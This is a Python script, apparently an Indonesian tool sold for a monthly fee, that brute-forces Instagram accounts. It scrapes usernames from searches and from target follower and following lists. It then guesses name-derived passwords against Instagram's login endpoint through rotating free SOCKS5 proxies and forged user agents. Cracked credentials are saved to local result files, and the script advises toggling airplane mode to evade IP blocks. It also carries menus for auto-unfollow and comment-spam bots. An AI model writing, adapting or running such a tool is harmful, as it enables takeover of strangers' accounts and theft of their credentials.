# coding:utf-8
#/usr/bin/python
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import rich
from rich.markdown import Markdown
import os, sys, subprocess, platform
import os
try:
    import requests
except ImportError:
    print('\n  Modul requests belum terinstall!...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  Modul Futures belum terinstall!...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n  Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
	
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as t
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.panel import Panel
from rich import print as cetak
from rich import print as prints
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from random import (choice,randint)
from rich.tree import Tree
from rich import pretty
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
try:
    os.mkdir('result')
except:
    pass

try:
    prox = requests.get(
        'https://www.proxy-list.download/api/v1/get?type=socks5').text
    open('.proxy.txt', 'w').write(prox)
except Exception as e:
    print('GAGAL')        
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')




#------------[ WARNA-CLASIC ]--------------#

CY='\x1b[1;96m'
H='\x1b[1;96m' #HIJAU
M='\x1b[1;96m' #MERAH
K='\x1b[1;96m' #KUNING
U='\x1b[1;96m' #UNGU
O='\x1b[1;96m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[1;96m' # WARNA MATI
B='\x1b[1;96m' # BIRUMUDA

#------------[ WARNA-UNTUK-RICH ]-----------#
Z2 = "[#00FFFF]" # Hitam
M2 = "[#00FFFF]" # Merah
H2 = "[#00FFFF]" # Hijau
K2 = "[#00FFFF]" # Kuning
B2 = "[#00FFFF]" # Biru
U2 = "[#00FFFF]" # Ungu
N2 = "[#00FFFF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#00FFFF]" # Putih
J2 = "[#00FFFF]" # Jingga
A2 = "[#00FFFF]" # Abu-Abu
#------------[ GANDA-CAMPURAN ]-----------#
rich = f'{N2}[{N2}•{N2}]'
crot = f'{N2}[{N2}✓{N2}]'
my_color = [J2,B2,O2,N2,K2,H2,M2]
asu = random.choice(my_color)

def waktu():

        now = datetime.now()

        hours = now.hour
        if 4 <= hours < 12:timenow = "Selamat Pagi"
        elif 12 <= hours < 15:timenow = "Selamat Siang"
        elif 15 <= hours < 18:timenow = "Selamat Sore"
        else:timenow = "Selamat Malam"
        return timenow

#---------------------[ USER-AGENT ]--------------------#

USN="Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 Instagram 46.0.0.15.96 Android (26/8.0.0; 480dpi; 1080x1920; samsung; SM-A520F; a5y17lte; samsungexynos7880; pt_BR; 109556226)"
ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
ugen2=[]
ugen=[]
follower=[]
uasm = []
reyUaSpecial=[]
s=requests.Session()
# CLEAR
def clear():
    os.system('clear')
    

for x in range(3000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; bright_whitemi {str(rr(4,9))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP"
	if ugent1 in uasm:pass
	else:uasm.append(ugent1)
	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; en-US; bright_whitemi Note {str(rr(5,8))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2 UCBrowser/13.4.0.{str(rr(1111,6666))} Mobile Safari/537.36"
	if ugent2 in uasm:pass
	else:uasm.append(ugent2)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Mobile UCBrowser/3.4.3.{str(rr(111,999))}"
	if ugent3 in uasm:pass
	else:uasm.append(ugent3)
   
for x in range(1000):
	rr= random.randint
	rc= random.choice
	A = f'Mozzila/5.0 (Linux; Android {str(rr(5,12))} AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0 Chrome/{str(rr(85,104))}.0.{str(rr(149,5195))}.{str(rr(1,164))} Mobile Safari/537.36'
	uaku2=f'{A}'
	ugen.append(uaku2)



#--------------------[ BANNER ]-----------------------#
def banner():
    clear();cetak(nel(f'''{asu}

                 {M2}•{K2}•{H2}•{O2} BruteForceInstagram🔥 {H2}•{K2}•{M2}•{asu}
                      ''', style='dark_orange',
 title=f'{N2}•{N2} WELCOME TO MY TOOLS {N2}•{N2}', subtitle=f'• {P2}{waktu()}{U2} •'))
    
try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 
#----------------------[ MAIN ]---------------------#

def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='bright_white ')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user

#---------------------+--[ LOGIN-COOKIES ]----------------------#

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            __anjing__ = '[dark_orange][[cyan]•>[jlue]] [dark_orange]Disarankan Login Menggunakan [dark_orange]Cookies!!\n[dark_orange][[dark_orange]•>[dark_orange]] [dark_orange]Sebab Kalau Lewat Manual Akun Gampang Terkena [dark_orange]Checkpoint!![dark_orange]'
            cetak(nel(__anjing__, style='dark_orange'))
            __kon__ = f'[dark_orange][[dark_orange]1[dark_orange]]. LOGIN MENGGUNAKAN COOKIE 	                ([dark_orange] ON[dark_orange] )\n[[dark_orange]2[dark_orange]]. LOGIN MENGGUNAKAN USERNAME & PASSWORD 	( [dark_orange]OFF[dark_orange])\n[[dark_orange]3[dark_orange]]. CARA MENDAPATKAN COOKIES INSTAGRAM	        ( [dark_orange]ON[dark_orange] )'
            cetak(nel(__kon__, style='dark_orange'))
            loginpil=input(f"  ├──> Pilih : {B}")
            if loginpil=='1':
                wel = '[dark_orange][[dark_orange]•[dark_orange]] Masukkan Username And Cookies Untuk Login'
                cetak(nel(wel, style='dark_orange'))
                us=input(f'{C}  [{B}•{C}] Masukan Username : ')
                cok=input(f'{C}  [{B}•{C}] Masukan Cookies  : ')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                print(f'  {C}[{B}•{C}]{H} Login SuccessFull.......!!{C}');time.sleep(2);os.system('python run.py')
            elif loginpil == '2':
                login()
            elif loginpil == '3':
                os.system('xdg-open https://youtu.be/EE3dBfhJ-gk');login_kamu()
            else:
                print(f'  ├──> Masukan Pilihan Yang Benar ');exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
        
 #-----------------------[ LOGIN-MANUAL ]-----------------------#
 
def login():
    global external
    try:
        wel = '# Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat'
        wel2 = mark(wel, style='dark_orange')
        sol().print(wel2)
        us = input(f"{CY}[•] Masukan username: {C}")
        pw = stdiomask.getpass(prompt=f'{CY}[•] Masukan password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='dark_orange')
        sol().print(wel2)
        exit()
    x = instagramAPI(us, pw).loginAPI()
    if x.get('status') == 'success':
        open('.username', 'a').write(us)
        open('.kukis.log', 'a').write(x.get('cookie'))
        cookie = {'cookie': x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        os.system('python run.py')
    elif x.get('status') == 'checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='dark_orange')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='dark_orange')
        sol().print(wel2)
        login()
        
def User_Agent():
	dpi_phone = [

		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x1812','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'

	return User_Agent


def user_agent():
	resolutions = ['1080x2178', '1080x2352', '1080x2130', '1080x2138', '1280x720', '1080x2123', '1080x2150' ,'1080x2176']
	versions = ['SM-G991U', 'CPH2211', 'SM-N986U', 'SM-G981V','SM-A105F','Infinix-X6810' ,'bright_whitemi Note 8' ,'Mi Note 10']
	dpis = ['120', '160', '320', '420' ,'440' ,'480']

	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)

	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

#--------------------------[ METODE-CRACK ]-------------------------#

class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            welcome=f'''[{H}•{C}]Selamat Datang : {nama}
[{H}•{C}]Username       : {self.username}
[{H}•{C}]Followers      : {followers}
[{H}•{C}]Following      : {following}
[{H}•{C}]Version        : 5.7'''
            print(welcome)
            prints(Panel('[[dark_orange]01[dark_orange ]] [dark_orange]Crack Dari Pencarian         [dark_orange ][[dark_orange]02[dark_orange ]] [dark_orange]Crack Dari Pengikut\n[dark_orange ][[dark_orange]03[dark_orange ]] [dark_orange]Crack dari Mengikuti         [dark_orange ][[dark_orange]04[dark_orange ]] [dark_orange]Checkpoint Detector  \n[dark_orange ][[dark_orange]05[dark_orange ]] [dark_orange]Lihat Hasil Crack            [dark_orange ][[dark_orange]06[dark_orange ]] [dark_orange]Bot Auto Unfollow\n[dark_orange ][[dark_orange]R[dark_orange ]] [dark_orange] informasi Script             [dark_orange ][[dark_orange]C[dark_orange ]] [dark_orange]Changelog\n[dark_orange ][[dark_orange]E[dark_orange ]] [dark_orange] Exit',title='MENU',style='dark_orange')),sys.stdout.flush()


    def BUG(self):
        donasi=f'''[white]- Hai Selamat Datang Di Script Saya Mungkin Kamu Adalah Penguna Baru !
- Script Masih Dalam Perkembangan 
- Saya Sarankan Menggunakan Kartu Indosat,xl,exis,3
- Harga Script
- 150k/bulan
- 500k Open Source 
- Silahkan menghubungi kontak saya 
- +6287752662364
- Soraa🔥🔥 '''
        cetak(nel(donasi, title=' • informasi • ', style='dark_orange'))
        sleep(0.50)
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='dark_orange')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='dark_orange')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='dark_orange')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        kel='# Apakah anda yakin ingin keluar ?'
        kel1=mark(kel,style='dark_orange ')
        sol().print(kel1)
        x=input(f'\n{H}[•] Jawaban [y/t] : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python run.py ')
        elif x in ('t','T'):
            os.system('python run.py ')
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self, cookie, api, id):
        if 'sukses' in lisensiku:
            try:
                idtar = f'#  TUNGGU SEDANG MENGUMPULKAN ID'
                idtar1 = mark(idtar, style='dark_orange')
                sol().print(idtar1)
                x = s.get(api % (id), cookies=cookie,
                          headers={"user-agent": USN})
                x_jason = json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid = x_jason['next_max_id']
                    for z in range(9999):
                        x = s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid, cookies=cookie, headers={"user-agent": USN})
                        x_jason = json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                maxid = x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:
                    pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}[!]  KONEKSI INTERNET TERPUTUS  {C}')
            except Exception as e:
                print(
                    f'\n{M}[!] UNSERNAME TIDAK DI TEMUKAN {C}')
            return internal
        else:
            lisensi()
            
    def ifoAPI(self, cookie, api, id):
        if 'sukses' in lisensiku:
            try:
                idtar = f'#  TUNGGU SEDANG MENGUMPULKAN ID'
                idtar1 = mark(idtar, style='dark_orange')
                sol().print(idtar1)
                x = s.get(api % (id), cookies=cookie,
                          headers={"user-agent": USN})
                x_jason = json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'mengikuti' in menudump:
                    maxid = x_jason['next_max_id']
                    for z in range(9999):
                        x = s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid, cookies=cookie, headers={"user-agent": USN})
                        x_jason = json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                maxid = x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:
                    pass
            except requests.exceptions.ConnectionError:
                exit(f'\n{M}[!]  KONEKSI INTERNET TERPUTUS  {C}')
            except Exception as e:
                print(
                    f'\n{M}[!] UNSERNAME TIDAK DI TEMUKAN {C}')
            return internal
        else:
            lisensi()

    def passwordAPI(self,xnx):
        idtar = f'[dark_orange]              	          {len(internal)} ID'
        idtar1 = nel(idtar, style='dark_orange ')
        cetak(nel(idtar1, title='TOTAL ID TERKUMPUL'))
        komb = '[dark_orange][1][/dark_orange] [dark_orange]Nama,Nama123,Nama1234[/dark_orange]\n[bright_white][2][/bright_white] [dark_orange]Nama,Nama123,Nama1234,Nama12345[/dark_orange]\n[bright_white][3][/bright_white] [dark_orange]Nama,Nama123,Nama1234,Nama12345,Nama123456[/dark_orange]\n[bright_white][4][/bright_white] [dark_orange]Nama,Nama123,Nama1234,Nama12345,Nama1122[/dark_orange]\n[dark_orange][5][/dark_orange] [dark_orange]Password Manual[/dark_orange]'
        komb1 = nel(komb, style='dark_orange ')
        cetak(nel(komb1, title='MASUKKAN PILIHAN PASSWORD'))
        c = input(f'{H}[•] MASUKKAN PILIHAN ANDA :{C} ')
        if c == '1':
            self.generateAPI(xnx, c)
        elif c == '2':
            self.generateAPI(xnx, c)
        elif c == '3':
            self.generateAPI(xnx, c)
        elif c == '4':
            self.generateAPI(xnx, c)
        elif c == '5':
            ui = '# PASSWORD MANUAL'
            uu = mark(ui, style='')
            sol().print(uu)
            print(f'{M} Contoh jangan,crack,mulu')
            print('')
            zx = input(f'{CY}[•] List password :{C} ')
            self.generateAPI(xnx, c, zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        io=f'[dark_orange][•] Hasil OK disimpan ke: result/{day}.txt\n[•] Hasil CP disimpan ke: result/{day}.txt'
        oi = nel(io, style='dark_orange ')
        cetak(nel(oi, title='CRACKING START'))
        ipku='# [🔥] ON-OFF MODE PESAWAT SETIAP 200 ID AGAR TERHINDAR DARI SPAM IP'
        ipku1=mark(ipku,style='dark_orange')
        sol().print(ipku1)
        with ThreadPoolExecutor(max_workers=30) as shinkai:
            for i in user:
                try:
                    username = i.split("|")[0]
                    password = i.split("|")[1].lower()
                    for w in password.split(" "):
                        if len(w) < 3:
                            continue
                        else:
                            w = w.lower()
                            if o == "1":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w+'123',w]
                                else:
                                    sandi = [w+'123',w]
                            elif o == "2":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w, w+'123', w+'1234', w+'12345']
                                else:
                                    sandi = [w+'123', w, w+'1234', w+'12345']
                            elif o == "3":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w, w+'123', w+'1234', w +'12345', w+'123456', password.lower()]

                                else:
                                    sandi = [w+'123', w, password.lower()]
                            elif o == "4":
                                if len(w) == 3 or len(w) == 4 or len(w) == 5:
                                    sandi = [w, w+'123', w+'1234',w+'12345', w+'1122', password.lower()]
                                else:
                                    sandi = [w+'123', w+'1234', w +'12345', password.lower()]
                            elif o == "5":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI, username, sandi)
								
                except:
                    #print('Error')
                    pass
        print('\n')
        
        oi = '# CRACK SELESAI'
        io = mark(oi, style='dark_orange')
        sol().print(io)
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'1217981644879628'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks5://'+nip}
                ua = random.choice(uasm)
                aa='Mozilla/5.0 (OS/2; U;'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c= 'SMN-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))})'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G','J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='Warp 4.5; en-US; rv:1.8.0.6) Gecko/20060730 MultiZilla/1.8.2.0i SeaMonkey/1.0.4/{str(rr(30,107))}/',
                h=random.randrange(73,200)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='SeaMonkey/1.0.4/{str(rr(30,107))}/'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                uafake = random.choice([
                f"Mozilla/5.0 (OS/2; U; {str(rr(1,12))}; Windows{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} SeaMonkey/1.0.4/",
                f"Mozilla/5.0 (OS/2; U; {str(rr(1,12))}; Windows{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} SeaMonkey/1.0.4/",
                f"Mozilla/5.0 (OS/2; U; {str(rr(1,12))}; Windows{str(rr(30,107))}.0.{str(rr(3200,5200))}.{str(rr(30,250))} SeaMonkey/1.0.4/"])
                token=s.get('https://z-p42.www.instagram.com/accounts/login/ajax/',)
                headers = {
                    'Host':'www.instagram.com',
                    'connection':'keep-alive',
                    'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
                    'x-ig-app-id':'936619743392459',
                    'X-ASBD-ID':'198387',
                    'x-ig-www-claim':'0',
                    'sec-ch-ua-mobile': '?1',
                    'access-control-expose-headers':'X-IG-Set-WWW-Claim',
                    'x-instagram-ajax':'1006821362',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                    'user-agent': uaku,
                    'x-csrftoken':token.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Linux"',
                    'Origin':'https://www.instagram.com',
                    'sec-fetch-site':'same-origin',
                    'sec-fetch-mode':'cors',
                    'sec-fetch-dest':'cross-site',
                    'referer':'https://z-p42.www.instagram.com/accounts/login/ajax/',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',}
                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "queryParams": "{}",
                    "optIntoOneTap": 'false',
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}\nUserAgent: {uafake}'
                    oi = nel(io, style='dark_orange')
                    print('\n')
                    cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} SUCCESS {day}{H2} • {K2} • {M2} • '))
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break
                    

                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    print('\n')
                    oi=nel(io,style='dark_orange')
                    cetak(nel(oi, title=f'{M2} • {K2} • {H2} • {O2} CHECKPOINT {day}{H2} • {K2} • {M2} • '))
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    self.crackAPI(user,pas)
                    break
                
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush()
                    self.crackAPI(user,pas)
                    loop-=1
                else:
                    continue

            loop+=1 
        except:
            self.crackAPI(user,pas)

    def checkAPI(self,user,pw):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            token=s.get("https:www.instagram.com",headers={"user-agent":User_Agent()}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'https://z-p42.www.instagram.com',
                'x-ig-www-claim': 'hmac.AR0Ft-pZRNZTzI7hjqy0oNQ3tHwi9IV_Q92-GUDay5ra5_FT',
                'x-instagram-ajax': '1006821362',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': random.choice(open("ua.txt","r").read().splitlines()),
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https:www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'cros-site',
                'referer': 'https://z-p42.www.instagram.com',
                'accept-language': 'en-GB,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='dark_orange ')
                print('\n')
                cetak(nel(oi, title='SUCCESS DETECTOR '))
                open(f"result/successdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                success.append(user)

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                oi = nel(io, style='dark_orange')
                print('\n')
                cetak(nel(oi, title=' CHECKPOINT DETECTOR'))
                open(f"result/checkpointdetector-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                checkpoint.append(user)

